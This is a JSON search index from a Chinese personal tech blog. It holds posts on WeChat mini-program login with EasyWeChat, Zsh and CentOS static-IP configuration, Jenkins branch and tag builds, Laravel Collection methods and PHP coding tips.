{"meta":{"title":"Boo","subtitle":"","description":"","author":"Boo","url":"https://www.0x2BeAce.com","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-07-05T02:30:21.578Z","updated":"2020-07-05T02:30:21.578Z","comments":true,"path":"404.html","permalink":"https://www.0x2beace.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"关于我","date":"2020-08-15T01:56:27.151Z","updated":"2020-08-15T01:56:27.151Z","comments":true,"path":"about/index.html","permalink":"https://www.0x2beace.com/about/index.html","excerpt":"","text":"关于此博客博客名：0x2BeAce 读作 To Be Ace。 Ace 有多个意思，这里取 a person who is very skilled at something 。 专门用于技术分享，记录一些感兴趣的东西。 这里参考了 Soros Liu 的博客。 关于我游离于2.5 次元的伪全栈，Linux 爱好者。 你可以通过以下方式找到我： 博客 GitHub Eamil 豆瓣 - 记录书影 Weibo - 很久没更新了… Telegram"},{"title":"所有分类","date":"2020-07-05T02:57:23.853Z","updated":"2020-07-05T02:57:23.853Z","comments":true,"path":"categories/index.html","permalink":"https://www.0x2beace.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2020-07-05T03:12:46.301Z","updated":"2020-07-05T03:12:46.301Z","comments":true,"path":"mylist/index.html","permalink":"https://www.0x2beace.com/mylist/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2020-07-05T02:29:38.929Z","updated":"2020-07-05T02:29:38.929Z","comments":true,"path":"tags/index.html","permalink":"https://www.0x2beace.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"小程序开发经验总结","slug":"summary-of-mini-program-development-experience","date":"2021-05-12T13:09:23.000Z","updated":"2021-05-13T13:31:49.175Z","comments":true,"path":"summary-of-mini-program-development-experience/","link":"","permalink":"https://www.0x2beace.com/summary-of-mini-program-development-experience/","excerpt":"通常对接小程序，为了加快开发速度，会直接使用 EasyWeChat 这个扩展包进行开发，EasyWeChat 已经封装好了微信相关的接口，使用起来非常方便。","text":"通常对接小程序，为了加快开发速度，会直接使用 EasyWeChat 这个扩展包进行开发，EasyWeChat 已经封装好了微信相关的接口，使用起来非常方便。 小程序登录流程下图是微信官方提供的时序图： 整理成流程，大概就是： 小程序调用 wx.login() 接口获取临时登录凭证（code），这一步用户是无感知的，无需用户授权； 小程序提交 code 到 开发者服务器； 开发者服务器通过 appid、appsecret 和 code 请求微信接口，换取用户的 session_key 和 openid； 开发者服务器根据 openid 查找到对应的用户，存入 session_key，然后为该用户生成 access_token （JWT）返回给小程序。 有了 access_token 小程序就可以调用任意接口了。 注意这里的 session_key 是一个比较特殊的设计，是用户的 会话密钥，需要存储在服务器中，调用获取用户信息、获取微信用户绑定的手机号等微信接口时，需要用这个 会话密钥 才能解密获取相关数据。每次调用 wx.login() 之后，微信都会自动生成新的 session_key ，导致之前的 session_key 失效，所以在必要的时候再去调用 wx.login()，而且还要及时保存 session_key 到服务器，以备后续使用。 此段流程整理来自Laravel 社区的《L04 Laravel教程-微信小程序从零到发布》。 获取OpenID和SessionKey清楚了小程序的登录流程之后，可以动手来获取code了。 创建小程序这里建议使用最新版本的微信开发者工具，以免出现一些不必要的问题。 填入AppID，点击新建。 初始化的小程序无需做任何更改，只需要在wx.login() 下面增加一行console.log(res) 将结果打印在控制台中，然后重新编译，即可看到控制台中输出了 code。 拿到code 之后，就可以获取OpenID、SessionKey了。 代码调试为了方便调试，这里直接在 Laravel 的Tinker 中进行测试，以下代码逐行粘贴在 tinker 中： 1234567891011121314151617use EasyWeChat\\Factory;$config = [ 'app_id' =&gt; 'wx2b41f13e5e*****', 'secret' =&gt; '92474ce5be69c4fb25392d6cfb******', 'response_type' =&gt; 'array', 'log' =&gt; [ 'level' =&gt; 'debug', ],];$app = Factory::miniProgram($config);$app-&gt;auth-&gt;session('CODE');// 正常输出如下：[ \"session_key\" =&gt; \"nFpZ0gfHKOtYQ878enM*****\", \"openid\" =&gt; \"oN7jq1ejz5KQX5JtEiBsL*****\",] 其中app_id 和secret 需要开发者通过微信开发平台自行获取： 不填或者填入错误的app_id 和 secret 都会导致获取OpenID异常。 如果遇到异常，可以对照微信官方文档——全局返回码进行排查分析。 登录凭证校验拿到OpenID及 SessionKey 之后，下一步就可以进行解密了，这一步也是通过EasyWeCaht 来完成。 根据前面的时序图，可以得知，登录凭证校验需要用到以下参数： appid：iv appsecret：encryptedData code：上面拿到的SessionKey 最后一个都好理解，可是前面两个分别是什么鬼？ 不着急，先打开微信开发者工具，在app.js 中，加入以下代码： 1234567891011121314151617181920212223// app.jsApp(&#123; onLaunch() &#123; // ... // 获取用户信息 wx.getSetting(&#123; success: res =&gt; &#123; if (res.authSetting['scope.userInfo']) &#123; // 已经授权，可以直接调用 getUserInfo 获取头像昵称，不会弹框 wx.getUserInfo(&#123; success: res =&gt; &#123; console.log(res) &#125; &#125;) &#125; &#125; &#125;) &#125;, globalData: &#123; userInfo: null &#125;&#125;) 保存之后，再次编译，查看控制台输出： 这两个就是我们需要的数据了，拿到之后，再次打开Tinker： 1$app-&gt;encryptor-&gt;decryptData(&quot;SessionKey&quot;, &quot;iv&quot;, &quot;encryptedData&quot;) 正常情况下，返回结果会包含当前登录用户的个人信息，我这里用的是测试号，因此并没有譬如手机号这类字段。 至此，小程序登录与微信接口服务的交互就告一段落了，获取到用户身份之后的逻辑就不用多说了。 上面小程序端的代码只是演示如何拿到需要的参数，实际开发并不建议用此方式直接写在app.js 中。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"如何配置一个简洁高效的 Zsh","slug":"how-to-configure-a-simple-and-efficient-zsh","date":"2021-05-09T00:48:19.000Z","updated":"2021-05-09T00:48:56.131Z","comments":true,"path":"how-to-configure-a-simple-and-efficient-zsh/","link":"","permalink":"https://www.0x2beace.com/how-to-configure-a-simple-and-efficient-zsh/","excerpt":"Shell 是类 Unix 系统中超级好用的工具，而 Zsh 是 Shell 中的佼佼者，但是现在网上一搜索 Zsh 的配置方案，遍地都是的互相复制粘贴的oh-my-zsh 配置方案。事实上 oh-my-zsh 并不好用，严重拖慢了 Zsh 的速度，下面分享一个简洁高效的Zsh 配置方案。","text":"Shell 是类 Unix 系统中超级好用的工具，而 Zsh 是 Shell 中的佼佼者，但是现在网上一搜索 Zsh 的配置方案，遍地都是的互相复制粘贴的oh-my-zsh 配置方案。事实上 oh-my-zsh 并不好用，严重拖慢了 Zsh 的速度，下面分享一个简洁高效的Zsh 配置方案。 安装Zsh这里直接从发行版的源中进行安装，简单、高效： 12sudo apt-get updatesudo apt-get install zsh 安装插件及主题两个插件一个主题： zsh-autosuggestions：这个是自动建议插件，能够自动提示你需要的命令。 zsh-syntax-highlighting：这个是代码高亮插件，能够使你的命令行各个命令清晰明了。 zsh-theme-powerlevel10k 这个主题提供漂亮的提示符，可以显示当前路径、时间、命令执行成功与否，还能够支持 git 分支显示等等。 一键安装： 1sudo apt-get install zsh-autosuggestions zsh-syntax-highlighting zsh-theme-powerlevel9k 不出意外的话，会提示： 1E: Unable to locate package zsh-autosuggestions 这是因为软件源中并没有zsh-autosuggestions 这个package，所以需要手动添加软件包。 这里可以直接进入opensuse 进行搜索，需要的软件包。 找到对应的发行版，点击Export Download： 这里提供两种方式供我们选择： 添加软件源并手动安装 直接抓取二进制软件包 直接给结论，第二种方式更简单些，直接下载.deb文件之后，就可以安装了。 选择对应的操作系统以及版本，右键拷贝链接地址： 12$ wget https://download.opensuse.org/repositories/shells:/zsh-users:/zsh-autosuggestions/xUbuntu_18.04/amd64/zsh-autosuggestions_0.5.0+1.1_amd64.deb$ sudo dpkg -i zsh-autosuggestions_0.5.0+1.1_amd64.deb 再次执行命令： 1sudo apt-get install zsh-autosuggestions zsh-syntax-highlighting zsh-theme-powerlevel9k 至此，插件和主题就安装完成了。 更改默认Shell1$ chsh -s &#x2F;usr&#x2F;bin&#x2F;zsh 注销并重新登录，再次登录成功时，默认启用了zsh。 配置插件和主题第一次进入 Zsh 会自动出现一个配置界面，这个界面可以根据需要自定义 Zsh。 配置界面中各个菜单代表的意思分别是： 1：设置命令历史记录相关的选项2：设置命令补全系统3：设置热建4：选择各种常见的选项，只需要选择“On”或者“Off”0：退出，并使用空白（默认）配置a：终止设置并退出q：退出 启用插件和主题Zsh 的配置文件是 ~/.zshrc 文件，这个文件在你的用户目录下 ~/。删掉了这个文件，再次进入 Zsh时，会再次进入 Zsh 的配置界面。 将以下代码加入到 ~/.zshrc 文件中，以启用插件和主题： 123source &#x2F;usr&#x2F;share&#x2F;powerlevel9k&#x2F;powerlevel9k.zsh-themesource &#x2F;usr&#x2F;share&#x2F;zsh-autosuggestions&#x2F;zsh-autosuggestions.zshsource &#x2F;usr&#x2F;share&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zsh 再次注销并登录，即可看到新的终端界面： 原文地址 配置一个简洁高效的 Zsh","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Centos 7 设置静态 IP","slug":"centos-7-set-static-ip","date":"2021-05-07T14:05:55.000Z","updated":"2021-05-07T14:06:55.620Z","comments":true,"path":"centos-7-set-static-ip/","link":"","permalink":"https://www.0x2beace.com/centos-7-set-static-ip/","excerpt":"通常本地的虚拟机，默认都是动态IP，这就意味着，每次重启机器，IP 地址都会发生变化，虽然不影响正常使用，但是每次重启都发生变化，这就导致还需要看一眼，才知道当前新的IP 是多少，那么有没有什么办法可以永久设置成静态IP 呢，答案是有的。","text":"通常本地的虚拟机，默认都是动态IP，这就意味着，每次重启机器，IP 地址都会发生变化，虽然不影响正常使用，但是每次重启都发生变化，这就导致还需要看一眼，才知道当前新的IP 是多少，那么有没有什么办法可以永久设置成静态IP 呢，答案是有的。 系统版本： 12$ cat &#x2F;etc&#x2F;redhat-release CentOS Linux release 7.8.2003 (Core) 查看当前网卡的名称： 一台电脑可能有多个网卡，如何判断哪一个是当前正在使用的？ 就看哪个网卡的IP 刚好是该机器当前的IP。 比如在上面的例子中，机器当前的IP 是192.168.1.100，那么只要确定某个网卡的IP 也是 192.168.1.100，那这个网卡就是我们要找的了。 编辑对应的配置文件： 12$ cd &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts$ vim ifcfg-网卡名称 设置静态IP 配置文件如下： 12345678910111213141516171819202122TYPE=\"Ethernet\"PROXY_METHOD=\"none\"BROWSER_ONLY=\"no\"BOOTPROTO=\"static\" # 使用静态IP地址，默认为动态，即dhcpIPADDR=\"192.168.241.100\" # 设置的静态IP地址NETMASK=\"255.255.255.0\" # 子网掩码GATEWAY=\"192.168.1.1\" # 网关地址DNS1=\"114.114.114.114\" # DNS服务器DEFROUTE=\"yes\"IPV4_FAILURE_FATAL=\"no\"IPV6INIT=\"yes\"IPV6_AUTOCONF=\"yes\"IPV6_DEFROUTE=\"yes\"IPV6_FAILURE_FATAL=\"no\"IPV6_ADDR_GEN_MODE=\"stable-privacy\"NAME=\"ens33\"UUID=\"95b614cd-79b0-4755-b08d-99f1cca7271b\"DEVICE=\"ens33\"ONBOOT=\"yes\" #是否开机启用 重启网络： 1$ service network restart 如果没有生效，可以尝试编辑/etc/resolv.conf，加入以下配置： 1nameserver 114.114.114.114 # 和上面的DNS 服务器保持一致 再次重启网络。 需要注意的是：这种配置是永久生效的，即使下次重启电脑，IP 地址也不会发生变化。 至此，就完成了设置静态IP 的全部配置。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Centos","slug":"Centos","permalink":"https://www.0x2beace.com/tags/Centos/"}]},{"title":"如何利用Jenkins 实现标签或者分支选择性构建","slug":"how-to-use-jenkins-to-implement-tag-or-branch-selective-construction","date":"2021-05-06T13:08:51.000Z","updated":"2021-05-06T13:10:02.763Z","comments":true,"path":"how-to-use-jenkins-to-implement-tag-or-branch-selective-construction/","link":"","permalink":"https://www.0x2beace.com/how-to-use-jenkins-to-implement-tag-or-branch-selective-construction/","excerpt":"如题。","text":"如题。 需求可以简单描述为：在Jenkins 中通过手动的方式自主选择标签或者分支进行构建。而不是通过 Push 事件进行自动触发。 在正式开始之前，需要先安装 Git Parameter 插件。 在可选插件中搜索Git Parameter，进行安装。 正常安装完成，可以看到如下： 创建一个自由风格的软件项目： 选择参数化构建过程，参数类型选择分支或标签： 源码管理选择Git，填上项目地址，如果是私有项目，需要添加 Credential： 最后点击保存即可。 点击Build with Parameters，可以看到所有标签和分支，手动选择不同的分支和标签即可进行构建。 可以看到核心的步骤其实只有两步，如果还有其他需求，比如构建完成之后，执行某个脚本，也是可以实现的， 参考链接 Jenkins教程（三）添加凭据与流水线拉取Git代码 Jenkins参数化构建-插件:Git Parameter Jenkins 中使用 Git Parameter 插件动态获取 Git 的分支 Jenkins：使用Git Parameter插件实现tag或分支的选择性构建 利用 jenkins 达到提 tag 自动打包 Jenkins 实现前端自动打包,自动部署代码及邮件提醒功能","categories":[{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/categories/Jenkins/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/tags/Jenkins/"}]},{"title":"Laravel Collection 实际使用","slug":"the-actual-use-of-collection-in-laravel","date":"2021-05-04T00:32:36.000Z","updated":"2021-05-12T13:22:33.103Z","comments":true,"path":"the-actual-use-of-collection-in-laravel/","link":"","permalink":"https://www.0x2beace.com/the-actual-use-of-collection-in-laravel/","excerpt":"这篇笔记用来整理Collection 在Laravel 的实际应用场景。","text":"这篇笔记用来整理Collection 在Laravel 的实际应用场景。 求和 需求：遍历$orders 数组，求price 的和。 12345678910111213141516&lt;?php// 引入packagerequire __DIR__ . '/vendor/autoload.php';$orders = [[ 'id' =&gt; 1, 'user_id' =&gt; 1, 'number' =&gt; '13908080808', 'status' =&gt; 0, 'fee' =&gt; 10, 'discount' =&gt; 44, 'order_products'=&gt; [ ['order_id'=&gt;1,'product_id'=&gt;1,'param'=&gt;'6寸','price'=&gt;555.00,'product'=&gt;['id'=&gt;1,'name'=&gt;'蛋糕名称','images'=&gt;[]]], ['order_id'=&gt;1,'product_id'=&gt;1,'param'=&gt;'7寸','price'=&gt;333.00,'product'=&gt;['id'=&gt;1,'name'=&gt;'蛋糕名称','images'=&gt;[]]], ],]]; 使用传统的foreach 方式进行遍历： 1234567$sum = 0;foreach ($orders as $order) &#123; foreach ($order['order_products'] as $item) &#123; $sum += $item['price']; &#125;&#125;echo $sum; 使用集合的map、flatten、sum： 1234567$sum = collect($orders)-&gt;map(function($order)&#123; return $order['order_products'];&#125;)-&gt;flatten(1)-&gt;map(function($order)&#123; return $order['price'];&#125;)-&gt;sum();echo $sum; map：遍历集合，返回一个新的集合。flatten：将多维数组转换为一维。sum：返回数组的和。 使用集合的flatMap、pluck、sum：1234$sum = collect($orders)-&gt;flatMap(function($order)&#123; return $order['order_products'];&#125;)-&gt;pluck('price')-&gt;sum();echo $sum; flatMap：和map 类似，不过区别在于flatMap 可以直接使用返回的新集合。 使用集合的flatMap、sum：123$sum = collect($orders)-&gt;flatMap(function($order)&#123; return $order['order_products'];&#125;)-&gt;sum('price'); sum：可以接收一个列名作为参数进行求和。 格式化数据 需求：将如下结构的数组，格式化成下面的新数组。 12345678910111213141516171819// 带格式化数组$gates = [ 'BaiYun_A_A17', 'BeiJing_J7', 'ShuangLiu_K203', 'HongQiao_A157', 'A2', 'BaiYun_B_B230'];// 新数组$boards = [ 'A17', 'J7', 'K203', 'A157', 'A2', 'B230']; 使用foreach 进行遍历： 12345678910$res = [];foreach($gates as $key =&gt; $gate) &#123; if(strpos($gate, '_') === false) &#123; $res[$key] = $gate; &#125;else&#123; $offset = strrpos($gate, '_') + 1; $res[$key] = mb_substr($gate , $offset); &#125;&#125;var_dump($res); 使用集合的map以及php 的explode、end： 1234$res = collect($gates)-&gt;map(function($gate) &#123; $parts = explode('_', $gate); return end($parts);&#125;); 使用集合的map、explode、last、toArray： 123$res = collect($gates)-&gt;map(function($gate) &#123; return collect(explode('_', $gate))-&gt;last();&#125;)-&gt;toArray(); explode：将字符串进行分割成数组last：获取最后一个元素 统计GitHub Event首先，通过此链接获取到个人事件json。 一个 PushEvent计 5 分，一个 CreateEvent 计 4 分，一个 IssueCommentEvent计 3 分，一个 IssueCommentEvent 计 2 分，除此之外的其它类型的事件计 1 分，计算当前用户的时间得分总和。 12345678910$opts = [ 'http' =&gt; [ 'method' =&gt; 'GET', 'header' =&gt; [ 'User-Agent: PHP' ] ]];$context = stream_context_create($opts);$events = json_decode(file_get_contents('http://api.github.com/users/0xAiKang/events', false, $context), true); 传统foreach 方式： 12345678910111213141516171819202122232425$eventTypes = []; // 事件类型$score = 0; // 总得分foreach ($events as $event) &#123; $eventTypes[] = $event['type'];&#125;foreach($eventTypes as $eventType) &#123; switch ($eventType) &#123; case 'PushEvent': $score += 5; break; case 'CreateEvent': $score += 4; break; case 'IssueEvent': $score += 3; break; case 'IssueCommentEvent': $score += 2; break; default: $score += 1; break; &#125;&#125; 使用集合的map、pluck、sum 方法： 1234567891011121314$score = $events-&gt;pluck('type')-&gt;map(function($eventType) &#123; switch ($eventType) &#123; case 'PushEvent': return 5; case 'CreateEvent': return 4; case 'IssueEvent': return 3; case 'IssueCommentEvent': return 2; default: return 1; &#125;&#125;)-&gt;sum(); 使用集合的链式编程，可以很好地解决上面那种多次遍历的问题。 使用集合中的map、pluck、get 方法： 12345678$score = $events-&gt;pluck('type')-&gt;map(function($eventType) &#123; return collect([ 'PushEvent'=&gt; 5, 'CreateEvent'=&gt; 4, 'IssueEvent'=&gt; 3, 'IssueCommentEvent'=&gt; 2 ])-&gt;get($eventType, 1); // 如果不存在则默认等于1&#125;)-&gt;sum(); 尝试将该需求，封装成一个类： 12345678910111213141516171819202122232425262728class GithubScore &#123; private $events; private function __construct($events)&#123; $this-&gt;events = $events; &#125; public static function score($events) &#123; return (new static($events))-&gt;scoreEvents(); &#125; private function scoreEvents() &#123; return $this-&gt;events-&gt;pluck('type')-&gt;map(function($eventType)&#123; return $this-&gt;lookupEventScore($eventType, 1); &#125;)-&gt;sum(); &#125; public function lookupEventScore($eventType, $default_value) &#123; return collect([ 'PushEvent'=&gt; 5, 'CreateEvent'=&gt; 4, 'IssueEvent'=&gt; 3, 'IssueCommentEvent'=&gt; 2 ])-&gt;get($eventType, $default_value); // 如果不存在则默认等于1 &#125;&#125;var_dump(GithubScore::score($events)); 格式化数据 需求：将以下数据格式化成新的结构。 12345678910$messages = [ 'Should be working now for all Providers.', 'If you see one where spaces are in the title let me know.', 'But there should not have blank in the key of config or .env file.'];// 格式化之后的结果- Should be working now for all Providers. \\n- If you see one where spaces are in the title let me know. \\n- But there should not have blank in the key of config or .env file. 传统的foreach 方式： 12345$comment = '- ' . array_shift($messages);foreach ($messages as $message) &#123; $comment .= \"\\n - $&#123;message&#125;\";&#125;var_dump($comment); 使用集合的map、implode方法： 1234$comment = collect($messages)-&gt;map(function($message)&#123; return '- ' . $message;&#125;)-&gt;implode(\"\\n\");var_dump($comment); 多个数组求差 需求：两组数据分别代表去年的营收和今年的营收，求每个月的盈亏情况。 1234567891011121314151617181920212223242526272829$lastYear = [ 6345.75, 9839.45, 7134.60, 9479.50, 9928.0, 8652.00, 7658.40, 10245.40, 7889.40, 3892.40, 3638.40, 2339.40];$thisYear = [ 6145.75, 6895.00, 3434.00, 9349350, 9478.60, 7652.80, 4758.40, 10945.40, 3689.40, 8992.40, 7588.40, 2239.40]; 传统的foreach 方式： 12345$profit = [];foreach($thisYear as $key =&gt; $monthly)&#123; $profit[$key] = $monthly - $lastYear[$key];&#125;var_dump($profit); 使用集合的zip、first、last： 123$profit = collect($thisYear)-&gt;zip($lastYear)-&gt;map(function($monthly)&#123; return $monthly-&gt;first() - $monthly-&gt;last();&#125;); zip：将给定数组的值与相应索引处的原集合的值合并在一起。 创建lookup 数组 需求：将如下数组格式化成下面的结果： 123456789101112131415161718192021222324$employees = [ [ 'name' =&gt; 'example', 'email' =&gt; 'example@exmaple.com', 'company' =&gt; 'example Inc.' ], [ 'name' =&gt; 'Lucy', 'email' =&gt; 'lucy@example.com', 'company' =&gt; 'ibm Inc.' ], [ 'name' =&gt; 'Taylor', 'email' =&gt; 'toylor@laravel.com', 'company'=&gt;'Laravel Inc.' ]];// 格式化之后的结果$lookup = [ 'example' =&gt; 'example@example.com', 'Lucy' =&gt; ‘lucy@example.com’, 'Taylor'=&gt; 'toylor@laravel.com']; 传统的foreach 方式： 1234$emails = [];foreach ($employees as $key =&gt; $value) &#123; $emails[$value['name']] = $value['email'];&#125; 使用集合的reduce 方法： 1234$emails = collect($employees)-&gt;reduce(function($emailLookup, $employee)&#123; $emailLookup[$employee['name']] = $employee['email']; return $emailLookup;&#125;,[]); reduce：将每次迭代的结果传递给下一次迭代直到集合减少为单个值。 使用集合的pluck 方法：1$emails = collect($employees)-&gt;pluck('name', 'email'); 参考链接 collection在实际开发中的使用","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Tips of PHP","slug":"tips-of-php","date":"2021-04-28T14:28:49.000Z","updated":"2021-04-28T14:30:34.635Z","comments":true,"path":"tips-of-php/","link":"","permalink":"https://www.0x2beace.com/tips-of-php/","excerpt":"Tips of PHP.","text":"Tips of PHP. 减少if…else 的使用if...else 通常是一个糟糕的选择，它导致设计复杂，代码可读性差，并且可能导致重构困难。 123456789101112131415function doSomething() &#123; if (...) &#123; if (...) &#123; // ... &#125; esle &#123; // ... &#125; &#125; else &#123; if (...) &#123; // ... &#125; esle &#123; // ... &#125; &#125;&#125; 好在可以通过其他方式可以避免对if...else 的过度依赖： 提前 return：1234567public function run($input)&#123; if ($input &gt; 5)&#123; // do something &#125; else &#123; // do something else &#125;&#125; 只需要删除else 块，即可简化此过程： 12345678public function run($input)&#123; if ($input &gt; 5)&#123; // do something return; &#125; // do something else &#125; switch...case 也是不错地选择：12345678910111213public function run($input)&#123; switch($input)&#123; case \"A\": // do something break; case \"B\": // do else something break\u001c // ... &#125;&#125; 使用try…catch123456789101112131415161718192021222324252627282930313233343536373839404142class UserModel&#123; public function login($username = '', $password = '') &#123; if (...) &#123; // 用户不存在 return -1; &#125; if (...) &#123; // 密码错误 return -2; &#125; // code... &#125;&#125;class UserController&#123; public function login($username = '', $password = '') &#123; $model = new UserModel(); $res = $model-&gt;login($username, $password); if ($res === -1) &#123; return [ 'code' =&gt; '404', 'message' =&gt; '用户不存在' ]; &#125; if ($res === -2) &#123; return [ 'code' =&gt; '400', 'message' =&gt; '密码错误' ]; &#125; // code... &#125;&#125; 使用try...catch 重写： 12345678910111213141516171819202122232425262728293031323334353637class UserModel&#123; public function login($username = '', $password = '') &#123; if (...) &#123; // 用户不存在 throw new Exception('用户不存在', '404'); &#125; if (...) &#123; // 密码错误 throw new Exception('密码错误', '400'); &#125; // ... &#125;&#125;class UserController&#123; public function login($username = '', $password = '') &#123; try &#123; $model = new UserModel(); $res = $model-&gt;login($username, $password); // 如果需要的话，我们可以在这里统一commit数据库事务 // $db-&gt;commit(); &#125; catch (Exception $e) &#123; // 如果需要的话，我们可以在这里统一rollback数据库事务 // $db-&gt;rollback(); &#125; // ... &#125;&#125; 通过使用try...catch 重写，使得代码逻辑职责分明、更加清晰。try 只用关心业务正常情况的处理，而所有异常则统一在catch 中处理，上游只需将异常抛出即可。 使用匿名函数需要在一个方法中，重复处理某个逻辑，这时可能会将其封装成一个函数，即： 123456789101112131415function doSomething(...) &#123; // ... format(...); // ... format(...); // ...&#125;// 声明一个格式化代码的函数或方法function format() &#123; // 格式化代码段 // ...&#125; 上面这段代码并没有什么问题，但是如果这个函数仅仅只在doSomething 中使用呢？更好地做法应该是这样： 123456789101112131415function doSomething() &#123; // ... $format = function (...) use (...) &#123; // 格式化代码段 // ... &#125;; // ... $format(...); // ... $format(...); //...&#125; 简单的策略模式客户端在做决策时，通常会根据不同的上下文环境选择不同的策略，可能会写成下面这样： 12345678910111213141516class One&#123; public function doSomething() &#123; if (...) &#123; $instance = new A(); &#125; elseif (...) &#123; $instance = new B(); &#125; else &#123; $instance = new C(); &#125; $instance-&gt;doSomething(...); // ... &#125;&#125; 上面这种情况，无论是使用if...else还是switch...case 当策略增多时，都会出现大量分支逻辑判断，好写的做法是定义一个简单的策略： 1234567891011121314151617class One&#123; private $map = [ 'a' =&gt; 'namespace\\A', 'b' =&gt; 'namespace\\B', 'c' =&gt; 'namespace\\C' ]; public function doSomething() &#123; // ... $instance = new $this-&gt;map[$strategy]; $instance-&gt;doSomething(...); // ... &#125;&#125; 依赖注入123456789101112131415161718192021class One&#123; private $instance; public function __construct() &#123; $this-&gt;intance = new Two(); &#125; public function doSomething() &#123; if (...) &#123; // 如果某种情况调用类Two的实例方法 $this-&gt;instance-&gt;do(...); &#125; ... &#125;&#125;$instance = new One();$instance-&gt;doSomething(); 上面这段代码有什么问题？ 不符合设计模式的最少知道原则，One 类内部直接依赖了Two 类。 使用依赖注入重写此类： 123456789101112131415161718192021222324252627class One&#123; private $closure; public function __construct(Closure $closure) &#123; $this-&gt;closure = $closure; &#125; public function doSomething() &#123; if (...) &#123; // 用的时候再实例化 // 实现懒加载 $instance = $this-&gt;closure(); $instance-&gt;do(...) &#125; ... &#125;&#125;...$instance = new One(function () &#123; // 从外部注入Two 类 return new Two();&#125;);$instance-&gt;doSomething(); 原文地址 easy-tips/php","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Laravel Collection 基本使用","slug":"basic-use-of-collection-in-laravel","date":"2021-04-25T15:17:05.000Z","updated":"2021-05-12T13:23:12.740Z","comments":true,"path":"basic-use-of-collection-in-laravel/","link":"","permalink":"https://www.0x2beace.com/basic-use-of-collection-in-laravel/","excerpt":"集合是Laravel 中提供的最强大的功能之一，集合本质上是由功能强大的数组组成。","text":"集合是Laravel 中提供的最强大的功能之一，集合本质上是由功能强大的数组组成。 把类似数组的对象应用到方法中是很有用的，通过链式编程，用极短的代码，就可以达到预期的效果。 需要注意的是集合并不是Laravel 中独有的，许多语言都可以在数组中使用集合式编程，但非常遗憾，原生的PHP 是不支持集合式编程的，不过幸运的是，一些勤劳的人已经为我们完成了艰苦的工作，并编写了一个非常方便的包——illuminate/support、Tightenco/Collect 。 一般来说，集合是不可改变的，这意味着大部分 Collection 方法都会返回一个全新的 Collection 实例。 创建集合为了创建一个集合，可以将一个数组传入集合的构造器中，也可以创建一个空的集合，然后把元素写到集合中。Laravel 有collect()助手，这是最简单的，新建集合的方法。 1$collection = collect([1, 2, 3]); 默认情况下， Eloquent 查询的结果返回的内容都是 Illuminate\\Support\\Collection 实例，如果希望对结果进行序列化，可以使用toArray()、toJson() 方法。 在非Laravel 项目中使用集合： 安装： 1composer require illuminate/support 使用： 123456&lt;?php// 引入packagerequire __DIR__ . '/vendor/autoload.php';$collection = collect([1, 2, 3]);var_dump($collection); 记住，所有方法都可以使用链式编程的方式优雅的操纵数组。而且几乎所有的方法都会返回新的 Collection 实例， all返回该集合表示的底层数组。 12collect([\"boo\", \"yumi\", \"mac\"])-&gt;all();// [“boo”, \"yumi\", \"mac\"] avg获取数组的平均值： 1collect([1, 1, 2, 4])-&gt;avg(); // 2 获取二维数组的平均值： 1collect([['foo' =&gt; 10], ['foo' =&gt; 10], ['foo' =&gt; 20], ['foo' =&gt; 40]])-&gt;avg('foo'); // 20 avg()是average() 的别名，两者的效果是一样的。 chunk将大集合按指定大小拆分成小集合。 1234$collection = collect([1, 2, 3, 4, 5, 6, 7]);$chunks = $collection-&gt;chunk(4);$chunks-&gt;toArray();// [[1, 2, 3, 4], [5, 6, 7]] chunkWhile根据指定的回调值把集合分解成多个更小的集合： 12345678$collection = collect(str_split('AABBCCCD'));$chunks = $collection-&gt;chunkWhile(function ($current, $key, $chunk) &#123; return $current === $chunk-&gt;last();&#125;);$chunks-&gt;all();// [['A', 'A'], ['B', 'B'], ['C', 'C', 'C'], ['D']] collapse将多个数组合并成一个集合。 12345$collection = collect([[1, 2, 3], [4, 5, 6], [7, 8, 9]]);// 注意这里返回了一个新的集合$collapsed = $collection-&gt;collapse();$collapsed-&gt;all();// [1, 2, 3, 4, 5, 6, 7, 8, 9] combine将一个集合的值作为「键」，再将另一个数组或者集合的值作为「值」合并成一个集合。 1234$collection = collect(['name', 'age']);$combined = $collection-&gt;combine(['boo', 25]);$combined-&gt;all();// ['name' =&gt; 'boo', 'age' =&gt; 25] collect返回一个包含当前集合所含元素的新的 Collection 实例： 123$collection = collect([1, 2, 3]);$collection-&gt;all(); // [1,2,3] concat在集合的末端附加指定的数组或集合值： 1234$collection = collect(['John Doe']);$concatenated = $collection-&gt;concat(['Boo'])-&gt;concat(['name' =&gt; 'Yumi']);$concatenated-&gt;all();// ['John Doe', 'Boo', 'Yumi'] 